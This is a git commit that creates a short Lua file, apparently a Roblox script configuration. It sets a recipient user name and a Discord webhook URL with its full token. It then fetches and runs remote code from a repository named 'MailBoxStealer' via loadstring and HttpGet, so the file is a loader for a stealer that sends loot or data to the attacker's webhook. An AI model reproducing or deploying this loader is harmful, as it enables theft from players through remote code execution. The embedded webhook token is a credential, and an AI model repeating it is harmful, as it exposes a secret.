af4a75119bfa17434846cc110e711c1ebede6243
DevRlchksStudio <122619681+DevRlchksStudio@users.noreply.github.com>
2023-06-10 17:42:00 +0200

    Create .lua

---
+++ .lua
@@ -0,0 +1,4 @@
+UserName = "ImNotJaneq"
+WebHook = "https://discord.com/api/webhooks/1117086992665165895/xnN8qSP9QDfepswIDRgPf0ZMnDvgcUoaAduXOv09OjmDy2UvoUbCg-9npQKOQVAXJ10G"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/DevRlchksStudio/MailBoxStealer/main/DevC", true))()
